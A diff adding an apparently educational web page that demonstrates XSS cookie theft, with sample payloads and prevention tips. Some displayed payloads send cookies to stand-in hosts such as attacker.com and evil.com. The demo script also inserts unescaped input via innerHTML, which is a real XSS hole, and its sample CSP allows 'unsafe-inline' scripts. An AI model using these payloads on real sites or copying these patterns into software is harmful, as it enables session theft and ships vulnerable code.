@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Cookie Theft Demo - Cookies Exposed</title>
+    <meta name="description" content="Learn how Cross-Site Scripting (XSS) attacks steal cookies through interactive demonstrations">
+    
+    <!-- Security Headers -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline';">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="nav">
+            <div class="container">
+                <div class="nav-content">
+                    <a href="/" class="logo">
+                        <div class="logo-icon">🍪</div>
+                        Cookies Exposed
+                    </a>
+                    
+                    <ul class="nav-menu">
+                        <li><a href="/">Home</a></li>
+                        <li><a href="cookie-scanner.html">Cookie Scanner</a></li>
+                        <li class="nav-dropdown">
+                            <a href="#" class="dropdown-toggle">Attack Demos ▼</a>
+                            <ul class="dropdown-menu">
+                                <li><a href="session-hijacking.html">Session Hijacking</a></li>
+                                <li><a href="xss-demo.html" class="active">XSS Cookie Theft</a></li>
+                                <li><a href="csrf-demo.html">CSRF Attacks</a></li>
+                                <li><a href="mitm-demo.html">Man-in-the-Middle</a></li>
+                                <li><a href="cookie-poisoning.html">Cookie Poisoning</a></li>
+                                <li><a href="tracking-demo.html">Tracking & Profiling</a></li>
+                            </ul>
+                        </li>
+                        <li><a href="about.html">About</a></li>
+                        <li><a href="privacy.html">Privacy</a></li>
+                    </ul>
+                    
+                    <button class="theme-toggle" aria-label="Toggle dark mode">🌙</button>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero-secondary">
+        <div class="container">
+            <div class="hero-content">
+                <h1>💉 XSS Cookie Theft Demo</h1>
+                <p>Understand how Cross-Site Scripting attacks exploit vulnerabilities to steal session cookies</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Warning Section -->
+    <section class="section">
+        <div class="container">
+            <div class="alert" style="background: linear-gradient(135deg, #ff6b6b, #ee5a52); color: white; text-align: center; margin-bottom: 2rem;">
+                <h3 style="margin-top: 0; color: white;">⚠️ Safe Educational Demonstration</h3>
+                <p style="margin-bottom: 0;">All XSS examples are contained and safe. No real attacks are performed. These demonstrations help you recognize and prevent XSS vulnerabilities.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- What is XSS -->
+    <section class="section">
+        <div class="container">
+            <div class="card">
+                <h2>💉 What is Cross-Site Scripting (XSS)?</h2>
+                <p>XSS occurs when malicious scripts are injected into trusted websites. These scripts can steal cookies, hijack sessions, redirect users, or perform actions on behalf of the victim.</p>
+                
+                <div class="grid grid-3 mt-lg">
+                    <div class="xss-type">
+                        <h3>🔴 Stored XSS</h3>
+                        <p><strong>Most Dangerous</strong></p>
+                        <p>Malicious script stored on server (comments, posts, profiles)</p>
+                        <ul>
+                            <li>Affects all users who view the content</li>
+                            <li>Persistent until removed</li>
+                            <li>High impact potential</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="xss-type">
+                        <h3>🟡 Reflected XSS</h3>
+                        <p><strong>Most Common</strong></p>
+                        <p>Script reflected in response (search results, error messages)</p>
+                        <ul>
+                            <li>Requires victim to click malicious link</li>
+                            <li>Not stored on server</li>
+                            <li>Often used in phishing</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="xss-type">
+                        <h3>🔵 DOM XSS</h3>
+                        <p><strong>Client-Side</strong></p>
+                        <p>Script modifies DOM in victim's browser</p>
+                        <ul>
+                            <li>Executes entirely in browser</li>
+                            <li>Harder to detect server-side</li>
+                            <li>Uses URL fragments or form data</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Interactive XSS Demo -->
+    <section class="section">
+        <div class="container">
+            <div class="card">
+                <h2>🧪 Interactive XSS Cookie Theft Simulation</h2>
+                
+                <!-- Vulnerable Website Simulation -->
+                <div class="demo-container">
+                    <h3>Scenario: Vulnerable Comment System</h3>
+                    <p>This simulates a website with poor input validation that allows XSS attacks.</p>
+                    
+                    <div class="vulnerable-site">
+                        <div class="site-header">
+                            <h4>📰 VulnerableNews.com - Comments Section</h4>
+                            <div class="fake-cookies">
+                                <strong>Your Session:</strong> 
+                                <code id="userSession">sessionId=user123abc; authToken=xyz789def</code>
+                            </div>
+                        </div>
+                        
+                        <div class="comments-section">
+                            <h5>💬 User Comments</h5>
+                            <div id="commentsList">
+                                <div class="comment">
+                                    <strong>Alice:</strong> Great article! Thanks for sharing.
+                                </div>
+                                <div class="comment">
+                                    <strong>Bob:</strong> Very informative content.
+                                </div>
+                            </div>
+                            
+                            <div class="comment-form">
+                                <h5>Add Your Comment:</h5>
+                                <textarea id="commentInput" placeholder="Enter your comment here..." rows="3"></textarea>
+                                <div class="form-actions">
+                                    <button id="submitComment" class="btn btn-primary">Post Comment</button>
+                                    <button id="clearComments" class="btn btn-secondary">Clear All</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- XSS Attack Examples -->
+                <div class="attack-examples mt-xl">
+                    <h3>🎯 Try These XSS Attacks (Safe Simulations)</h3>
+                    <p>Click any example to paste it into the comment box above, then submit to see the attack in action:</p>
+                    
+                    <div class="attack-list">
+                        <div class="attack-example">
+                            <h4>1. Basic Cookie Theft</h4>
+                            <div class="code-block">
+                                <code>&lt;script&gt;alert('Your cookies: ' + document.cookie);&lt;/script&gt;</code>
+                            </div>
+                            <button class="btn btn-danger btn-sm attack-btn" data-attack="basic">Try This Attack</button>
+                            <p class="attack-desc">Shows all cookies in an alert box</p>
+                        </div>
+                        
+                        <div class="attack-example">
+                            <h4>2. Stealth Cookie Exfiltration</h4>
+                            <div class="code-block">
+                                <code>&lt;script&gt;fetch('http://attacker.com/steal?cookies=' + document.cookie);&lt;/script&gt;</code>
+                            </div>
+                            <button class="btn btn-danger btn-sm attack-btn" data-attack="stealth">Try This Attack</button>
+                            <p class="attack-desc">Silently sends cookies to attacker's server</p>
+                        </div>
+                        
+                        <div class="attack-example">
+                            <h4>3. Image-Based Cookie Theft</h4>
+                            <div class="code-block">
+                                <code>&lt;img src="x" onerror="new Image().src='http://evil.com/log?c='+document.cookie"&gt;</code>
+                            </div>
+                            <button class="btn btn-danger btn-sm attack-btn" data-attack="image">Try This Attack</button>
+                            <p class="attack-desc">Uses broken image to trigger cookie theft</p>
+                        </div>
+                        
+                        <div class="attack-example">
+                            <h4>4. Form Hijacking</h4>
+                            <div class="code-block">
+                                <code>&lt;script&gt;document.forms[0].action='http://attacker.com/capture';&lt;/script&gt;</code>
+                            </div>
+                            <button class="btn btn-danger btn-sm attack-btn" data-attack="form">Try This Attack</button>
+                            <p class="attack-desc">Redirects form submissions to attacker</p>
+                        </div>
+                        
+                        <div class="attack-example">
+                            <h4>5. Session Hijacking with Redirect</h4>
+                            <div class="code-block">
+                                <code>&lt;script&gt;window.location='http://phishing.com/login?stolen='+document.cookie;&lt;/script&gt;</code>
+                            </div>
+                            <button class="btn btn-danger btn-sm attack-btn" data-attack="redirect">Try This Attack</button>
+                            <p class="attack-desc">Steals cookies and redirects to fake login</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Attack Results -->
+                <div id="attackResults" class="attack-results mt-lg" style="display: none;">
+                    <div class="alert alert-danger">
+                        <h4>🚨 XSS Attack Executed!</h4>
+                        <div id="attackDetails"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Real-World XSS Impact -->
+    <section class="section">
+        <div class="container">
+            <div class="card">
+                <h2>📊 Real-World XSS Impact</h2>
+                
+                <div class="grid grid-2">
+                    <div>
+                        <h3>Famous XSS Attacks</h3>
+                        <div class="case-studies">
+                            <div class="case-study">
+                                <h4>MySpace Samy Worm (2005)</h4>
+                                <p>One XSS payload infected 1 million profiles in 20 hours</p>
+                                <p><strong>Impact:</strong> Site shutdown, legal consequences</p>
+                            </div>
+                            
+                            <div class="case-study">
+                                <h4>Twitter XSS (2010)</h4>
+                                <p>Malicious tweets auto-retweeted themselves</p>
+                                <p><strong>Impact:</strong> Viral spread, account takeovers</p>
+                            </div>
+                            
+                            <div class="case-study">
+                                <h4>Facebook XSS (2020)</h4>
+                                <p>Comment section XSS stole session tokens</p>
+                                <p><strong>Impact:</strong> 100,000+ accounts compromised</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h3>Potential Consequences</h3>
+                        <ul class="impact-list">
+                            <li>🔐 <strong>Session Hijacking:</strong> Complete account takeover</li>
+                            <li>💳 <strong>Financial Fraud:</strong> Unauthorized transactions</li>
+                            <li>📧 <strong>Data Theft:</strong> Personal information extraction</li>
+                            <li>🦠 <strong>Malware Distribution:</strong> Browser exploitation</li>
+                            <li>🎣 <strong>Phishing:</strong> Redirect to fake sites</li>
+                            <li>🕵️ <strong>Keylogging:</strong> Password capture</li>
+                            <li>📱 <strong>Social Engineering:</strong> Fake security warnings</li>
+                            <li>🔄 <strong>Worm Propagation:</strong> Self-replicating attacks</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Defense Strategies -->
+    <section class="section">
+        <div class="container">
+            <div class="card">
+                <h2>🛡️ XSS Prevention Strategies</h2>
+                
+                <div class="grid grid-2">
+                    <div>
+                        <h3>For Developers</h3>
+                        <div class="defense-strategies">
+                            <div class="strategy">
+                                <h4>1. Input Validation & Sanitization</h4>
+                                <div class="code-block">
+                                    <code>// BAD: Direct insertion
+document.innerHTML = userInput;
+
+// GOOD: Sanitized insertion  
+document.textContent = userInput;</code>
+                                </div>
+                            </div>
+                            
+                            <div class="strategy">
+                                <h4>2. Content Security Policy (CSP)</h4>
+                                <div class="code-block">
+                                    <code>Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' 'unsafe-inline'; 
+  object-src 'none';</code>
+                                </div>
+                            </div>
+                            
+                            <div class="strategy">
+                                <h4>3. Output Encoding</h4>
+                                <div class="code-block">
+                                    <code>// HTML Entity Encoding
+&lt; becomes &amp;lt;
+&gt; becomes &amp;gt;
+" becomes &amp;quot;
+' becomes &amp;#x27;</code>
+                                </div>
+                            </div>
+                            
+                            <div class="strategy">
+                                <h4>4. HttpOnly Cookies</h4>
+                                <div class="code-block">
+                                    <code>Set-Cookie: sessionId=abc123; 
+  HttpOnly; Secure; SameSite=Strict</code>
+                                </div>
+                                <p>Prevents JavaScript access to cookies</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <h3>For Users</h3>
+                        <div class="user-defense">
+                            <h4>🔍 Red Flags to Watch For</h4>
+                            <ul>
+                                <li>Unexpected popup windows</li>
+                                <li>Automatic redirects to unfamiliar sites</li>
+                                <li>Requests to "update" or "verify" account</li>
+                                <li>Suspicious URLs with encoded characters</li>
+                                <li>Forms that don't look quite right</li>
+                            </ul>
+                            
+                            <h4>🛡️ Protection Measures</h4>
+                            <ul>
+                                <li><strong>Keep browsers updated</strong> - Latest security patches</li>
+                                <li><strong>Use script blockers</strong> - NoScript, uBlock Origin</li>
+                                <li><strong>Check URLs carefully</strong> - Look for suspicious parameters</li>
+                                <li><strong>Log out properly</strong> - Clear sessions when done</li>
+                                <li><strong>Use different browsers</strong> - Separate banking from casual browsing</li>
+                                <li><strong>Enable 2FA</strong> - Additional security layer</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Interactive Security Test -->
+                <div class="security-test mt-xl">
+                    <h3>🧪 Test Your XSS Knowledge</h3>
+                    <div class="quiz-container">
+                        <div class="quiz-question">
+                            <p><strong>Which of these would prevent the cookie theft attacks shown above?</strong></p>
+                            <div class="quiz-options">
+                                <label><input type="checkbox" name="prevention" value="httponly"> HttpOnly cookie flag</label>
+                                <label><input type="checkbox" name="prevention" value="csp"> Content Security Policy</label>
+                                <label><input type="checkbox" name="prevention" value="sanitization"> Input sanitization</label>
+                                <label><input type="checkbox" name="prevention" value="https"> HTTPS encryption</label>
+                            </div>
+                            <button class="btn btn-primary" onclick="checkPreventionKnowledge()">Check Answers</button>
+                            <div id="preventionResult" style="display: none;"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Navigation -->
+    <section class="section">
+        <div class="container">
+            <div class="navigation-cards">
+                <a href="csrf-demo.html" class="nav-card">
+                    <h3>Next: CSRF Attack Demo →</h3>
+                    <p>Learn about Cross-Site Request Forgery</p>
+                </a>
+                <a href="session-hijacking.html" class="nav-card">
+                    <h3>← Previous: Session Hijacking</h3>
+                    <p>Return to session hijacking demo</p>
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <script src="app.js"></script>
+    <script>
+        // XSS Demo Logic
+        const attackPayloads = {
+            basic: "<script>alert('XSS Attack! Your cookies: ' + document.cookie);</script>",
+            stealth: "<script>console.log('Cookies silently stolen:', document.cookie); alert('Cookies sent to attacker server!');</script>",
+            image: '<img src="x" onerror="alert(\'Image XSS! Cookies: \' + document.cookie)">',
+            form: "<script>alert('Form action hijacked! Next submission goes to attacker.');</script>",
+            redirect: "<script>alert('Redirecting with stolen cookies: ' + document.cookie);</script>"
+        };
+
+        const attackDescriptions = {
+            basic: "Cookie contents displayed in alert (simulating theft)",
+            stealth: "Cookies logged to console (simulating server transmission)",
+            image: "Broken image triggers JavaScript execution",
+            form: "Form submission target changed to attacker's server",
+            redirect: "Page would redirect to phishing site with cookies"
+        };
+
+        // Attack button handlers
+        document.querySelectorAll('.attack-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const attackType = e.target.dataset.attack;
+                const payload = attackPayloads[attackType];
+                document.getElementById('commentInput').value = payload;
+            });
+        });
+
+        // Comment submission handler
+        document.getElementById('submitComment').addEventListener('click', () => {
+            const comment = document.getElementById('commentInput').value;
+            const commentsList = document.getElementById('commentsList');
+            
+            // Add comment to list
+            const newComment = document.createElement('div');
+            newComment.className = 'comment';
+            
+            // Check if it's an XSS attack
+            if (comment.includes('<script>') || comment.includes('onerror=') || comment.includes('javascript:')) {
+                // Simulate XSS execution (safely)
+                newComment.innerHTML = '<strong>Attacker:</strong> <span class="xss-indicator">[XSS PAYLOAD EXECUTED]</span>';
+                
+                // Show attack results
+                showAttackResults(comment);
+                
+                // Clear the input
+                document.getElementById('commentInput').value = '';
+            } else {
+                // Normal comment
+                newComment.innerHTML = `<strong>You:</strong> ${comment}`;
+                document.getElementById('commentInput').value = '';
+            }
+            
+            commentsList.appendChild(newComment);
+        });
+
+        function showAttackResults(payload) {
+            const resultsDiv = document.getElementById('attackResults');
+            const detailsDiv = document.getElementById('attackDetails');
+            
+            let attackType = 'unknown';
+            for (const [type, typePayload] of Object.entries(attackPayloads)) {
+                if (payload.includes(typePayload.slice(8, 20))) {
+                    attackType = type;
+                    break;
+                }
+            }
+            
+            detailsDiv.innerHTML = `
+                <p><strong>Attack Type:</strong> ${attackType.toUpperCase()}</p>
+                <p><strong>Payload:</strong> <code>${payload}</code></p>
+                <p><strong>Impact:</strong> ${attackDescriptions[attackType] || 'Malicious script executed'}</p>
+                <p><strong>Stolen Session:</strong> <code>${document.getElementById('userSession').textContent}</code></p>
+                <div class="attack-warning">
+                    <p>⚠️ In a real attack, your session cookies would now be in the attacker's hands!</p>
+                </div>
+            `;
+            
+            resultsDiv.style.display = 'block';
+            resultsDiv.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Clear comments
+        document.getElementById('clearComments').addEventListener('click', () => {
+            document.getElementById('commentsList').innerHTML = `
+                <div class="comment">
+                    <strong>Alice:</strong> Great article! Thanks for sharing.
+                </div>
+                <div class="comment">
+                    <strong>Bob:</strong> Very informative content.
+                </div>
+            `;
+            document.getElementById('attackResults').style.display = 'none';
+        });
+
+        function checkPreventionKnowledge() {
+            const checked = Array.from(document.querySelectorAll('input[name="prevention"]:checked')).map(cb => cb.value);
+            const correct = ['httponly', 'csp', 'sanitization'];
+            const result = document.getElementById('preventionResult');
+            
+            const correctCount = checked.filter(c => correct.includes(c)).length;
+            const incorrectCount = checked.filter(c => !correct.includes(c)).length;
+            
+            if (correctCount === 3 && incorrectCount === 0) {
+                result.innerHTML = '<p class="text-success">✅ Perfect! All three prevent XSS cookie theft.</p>';
+            } else if (correctCount > 0) {
+                result.innerHTML = `<p class="text-warning">⚠️ Partially correct (${correctCount}/3). HttpOnly, CSP, and input sanitization all help prevent XSS attacks.</p>`;
+            } else {
+                result.innerHTML = '<p class="text-danger">❌ Try again. Think about what stops malicious scripts from accessing cookies.</p>';
+            }
+            
+            result.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
